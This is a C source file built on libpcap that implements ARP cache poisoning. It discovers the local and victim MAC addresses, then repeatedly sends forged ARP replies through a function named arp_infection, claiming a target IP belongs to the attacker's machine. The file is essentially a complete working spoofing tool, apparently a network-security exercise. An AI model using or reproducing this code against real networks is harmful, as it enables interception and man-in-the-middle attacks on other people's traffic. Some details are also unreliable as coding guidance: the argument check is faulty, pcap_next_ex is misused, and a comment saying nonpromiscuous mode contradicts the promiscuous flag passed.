/* main.c */
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/ether.h>		/* for ether_aton() */
#include <netinet/in.h>
#include <net/if.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <arpa/inet.h>			/* for inet_addr() */
#include "net_header.h"			/* Net Header Structure */

/*
 *  send_arp
 *  return : true(0), false(-1)
 *  make a arp packet & send a arp packet
 */
#define ETHER_SIZE  sizeof(struct libnet_ethernet_hdr)
#define ARP_SIZE    sizeof(struct libnet_arp_hdr)
#define ARP_DATA    sizeof(struct _arp_data)
#define PACKET_SIZE 256

int 
send_arp (
	pcap_t *handle, 
	pether_hdr peh, 
	parp_hdr pah, 
	parp_data pad
) {
    u_char packet[PACKET_SIZE] = {0, };

    memcpy(packet, peh, ETHER_SIZE);
    memcpy(packet+ETHER_SIZE, pah, ARP_SIZE);
    memcpy(packet+ETHER_SIZE+ARP_SIZE, pad, ARP_DATA);
    
    if(pcap_sendpacket(handle, packet, ETHER_SIZE+ARP_SIZE+ARP_DATA) != 0)
	return -1;

    return 0;
}


/*
 *  recv_arp
 *  return : true(0), false(-1)
 *  receive a arp reply packet
 */

int 
recv_arp (
	pcap_t *handle, 
	byte* tmac
) {
    struct pcap_pkthdr header;        /* The header that pcap gives us */
    const u_char *packet;             /* The actual packet */

    while(1) {
	if(pcap_next_ex(handle, (struct pcap_pkthdr **)&header, &packet) == 1) {
	    if(((pether_hdr)packet)->ether_type == htons(ETHERTYPE_ARP)) {
		packet += ETHER_SIZE;

		if(((parp_hdr)packet)->ar_op == htons(ARPOP_REPLY)) {
		    packet += ARP_SIZE;

		    memcpy(tmac, ether_ntoa((const struct ether_addr*)((parp_data)packet)->sender_ha), ETHER_ADDRSTRLEN); 
		    break;
		} else return -1;
	    }
	}
    }

    return 0;
}


/*
 *  normal_arp
 *  return : true(1), false(0)
 *  normal arp request & reply
 */
int 
normal_arp (
	pcap_t *handle, 
	const byte* smac, 
	const byte* sip, 
	BYTE* tmac, 
	const byte* tip
) {
    ether_hdr eh;			/* Ethernet Header */
    arp_hdr ah;				/* ARP Header */
    arp_data ad;			/* ARP Data */

    /* Setting Ethernet_Header */
    memset(&eh.ether_dhost, -1, ETHER_ADDR_LEN);
    memcpy(&eh.ether_shost, ether_aton(smac), ETHER_ADDR_LEN);
    eh.ether_type = ntohs(ETHERTYPE_ARP);

    /* Setting ARP_Header */
    ah.ar_hrd = ntohs(ARPHRD_ETHER);
    ah.ar_pro = ntohs(ETHERTYPE_IP);
    ah.ar_hln = ETHER_ADDR_LEN;
    ah.ar_pln = IP_ADDR_LEN;
    ah.ar_op = ntohs(ARPOP_REQUEST);

    /* Setting ARP_Data */
    memcpy(&ad.sender_ha, ether_aton(smac), ETHER_ADDR_LEN);
    ad.sender_ip = inet_addr(sip);
    memset(&ad.target_ha, 0, ETHER_ADDR_LEN);
    ad.target_ip = inet_addr(tip);

    send_arp(handle, &eh, &ah, &ad);
    if(!recv_arp(handle, (byte*)tmac)) return 1;

    return 0;
}


/*
 *  arp_infection
 *  return : X
 *  infect arp request
 */
void 
arp_infection (
	pcap_t *handle, 
	const byte* my_mac, 
	const byte* tip, 
	const byte* smac, 
	const byte* sip
) {
    ether_hdr eh;			/* Ethernet Header */
    arp_hdr ah;				/* ARP Header */
    arp_data ad;			/* ARP Data */

    /* Setting Ethernet_Header */
    memcpy(&eh.ether_dhost, ether_aton(smac), ETHER_ADDR_LEN);
    memcpy(&eh.ether_shost, ether_aton(my_mac), ETHER_ADDR_LEN);
    eh.ether_type = ntohs(ETHERTYPE_ARP);

    /* Setting ARP_Header */
    ah.ar_hrd = ntohs(ARPHRD_ETHER);
    ah.ar_pro = ntohs(ETHERTYPE_IP);
    ah.ar_hln = ETHER_ADDR_LEN;
    ah.ar_pln = IP_ADDR_LEN;
    ah.ar_op = ntohs(ARPOP_REPLY);

    /* Setting ARP_Data */
    memcpy(&ad.sender_ha, ether_aton(my_mac), ETHER_ADDR_LEN);
    ad.sender_ip = inet_addr(tip);
    memcpy(&ad.target_ha, ether_aton(smac), ETHER_ADDR_LEN);
    ad.target_ip = inet_addr(sip);

    while(1) {
	printf("Send Infect ARP Reply...\n");
	send_arp(handle, &eh, &ah, &ad);
	sleep(3);
    }
}


/*
 *  convrt_mac
 *  return : X
 *  Convert 6 bytes address to MAC Address string
 */
void 
convrt_mac ( 
	const byte *data, 
	byte *cvrt_str, 
	int sz 
) {
    char buf[ETHER_ADDRSTRLEN] = {0, };
    char t_buf[8];
    char *stp = strtok( (char *)data , ":" );
    int temp=0;
    do
    {
        memset( t_buf, 0x0, sizeof(t_buf) );
        sscanf( stp, "%x", &temp );
        snprintf( t_buf, sizeof(t_buf)-1, "%02X", temp );
        strncat( buf, t_buf, sizeof(buf)-1 );
        strncat( buf, ":", sizeof(buf)-1 );
    } while( (stp = strtok( NULL , ":" )) != NULL );
    buf[strlen(buf) -1] = '\0';
    strncpy( cvrt_str, buf, sz );
}


/*
 *  get_my_MAC
 *  return : true(0), false(-1)
 *  Get My MAC Address
 */
#define REQ_CNT 20

int 
get_my_mac (
	p_addr_list my_al
) {
    int sockfd, cnt, req_cnt = REQ_CNT;
    struct sockaddr_in *sock;
    struct ifconf ifcnf_s;
    struct ifreq *ifr_s;
    sockfd = socket( PF_INET , SOCK_DGRAM , 0 );
    if( sockfd < 0 ) {
	perror( "socket()" );
	return -1;
    }
    memset( (void *)&ifcnf_s , 0x0 , sizeof(ifcnf_s) );
    ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
    ifcnf_s.ifc_buf = malloc(ifcnf_s.ifc_len);
    if( ioctl( sockfd, SIOCGIFCONF, (char *)&ifcnf_s ) < 0 ) {
        perror( "ioctl() - SIOCGIFCONF" );
        return -1;
    }
    
    if( (DWORD)ifcnf_s.ifc_len > (DWORD)(sizeof(struct ifreq) * req_cnt) ) {
        req_cnt = ifcnf_s.ifc_len;
        ifcnf_s.ifc_buf = realloc( ifcnf_s.ifc_buf, req_cnt );
    }
    ifr_s = ifcnf_s.ifc_req;
    for( cnt = 0 ; cnt < ifcnf_s.ifc_len ; cnt += sizeof(struct ifreq), ifr_s++ )
    {
        if( ioctl( sockfd, SIOCGIFFLAGS, ifr_s ) < 0 ) {
            perror( "ioctl() - SIOCGIFFLAGS" );
            return -1;
        }
        
	if( ifr_s->ifr_flags & IFF_LOOPBACK )
            continue;
	sock = (struct sockaddr_in *)&ifr_s->ifr_addr;
	memcpy(my_al->ip, inet_ntoa(sock->sin_addr), INET_ADDRSTRLEN);
        if( ioctl( sockfd, SIOCGIFHWADDR, ifr_s ) < 0 ) {
            perror( "ioctl() - SIOCGIFHWADDR" );
            return -1;
        }
        convrt_mac((const char*)ether_ntoa((struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), (char*)my_al->mac, ETHER_ADDRSTRLEN);
	printf("My IP Address : %s\n", my_al->ip);
	printf("My MAC Address : %s\n", my_al->mac);
    }

    free(ifcnf_s.ifc_buf);
    return 0;
}

/*
 *  main
 *  return : true(0), false
 *  Main Function
 */
#define PROMISC	    1
#define NONPROMISC  0
#define TIME_OUT    1000

int 
main (
	int argc, 
	char *argv[]
) {
    pcap_t *handle;			/* Session Handle */
    char *dev;				/* Interface */
    DWORD gen_num;			/* Generated Number */
    p_addr_list s_al;			/* Sender's Linked List */
    p_addr_list t_al;			/* Target's Linked List */
    addr_list my_al;			/* My Linked List */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error String */

    if((argc <= 4) && ((argc%2) != 0)) {
        fprintf(stderr, "Usage : %s <interface> <sender ip> <target ip> [<sender ip> <target ip>...]\n", argv[0]);
        return(2);
    }

    gen_num = (argc/2)-1;

    s_al = (p_addr_list) malloc(sizeof(addr_list)*gen_num);
    memset(s_al, 0, sizeof(addr_list)*gen_num);
    for(DWORD i=0; i<gen_num; i++)
	strncpy((char *__restrict)s_al[i].ip, argv[2+(i*2)], INET_ADDRSTRLEN);

    t_al = (p_addr_list) malloc(sizeof(addr_list)*gen_num);
    memset(t_al, 0, sizeof(addr_list)*gen_num);
    for(DWORD i=0; i<gen_num; i++)
	strncpy((char *__restrict)t_al[i].ip, argv[(i*2)+3], INET_ADDRSTRLEN);
    
    dev = argv[1];

    get_my_mac(&my_al);

    /* Nonpromiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, PROMISC, TIME_OUT, errbuf);
    if (handle == NULL) {
    	fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
    	return(2);
    }

    // Get Sender's MAC Address
    if(normal_arp(handle, 
		(const byte*)my_al.mac, 
		(const byte*)my_al.ip, 
		s_al[0].mac, 
		(const byte*)s_al[0].ip)) 
    {
	puts("===== ARP Request Result ====");
	printf("Sender's MAC Address : %s\n", s_al[0].mac);
	puts("=============================");

	arp_infection(handle, 
		(const byte*)my_al.mac, 
		(const byte*)t_al[0].ip, 
		(const byte*)s_al[0].mac, 
		(const byte*)s_al[0].ip);
    }

    /* And close the session */
    pcap_close(handle);
	    
    return(0);
}
